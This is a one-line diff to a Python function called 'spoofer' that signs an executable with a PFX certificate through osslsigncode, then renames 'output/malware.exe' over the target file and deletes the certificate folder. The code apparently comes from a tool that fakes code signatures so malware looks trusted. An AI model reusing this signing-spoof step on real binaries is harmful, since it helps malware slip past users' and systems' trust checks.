@@ -53,7 +53,7 @@ def spoofer(host, port, filename, out):
         args = ("osslsigncode", "sign", "-pkcs12", PFXFILE, "-n", core.varname_creator(), "-i", TIMESTAMP_URL, "-in", filename, "-out", out)
         call(args, stdout=PIPE)
         core.exe_signed()
-        system(f"mv output/Malware.exe {filename} && rm -rf certs/")
+        system(f"mv output/malware.exe {filename} && rm -rf certs/")
 
 
     except Exception as ex:
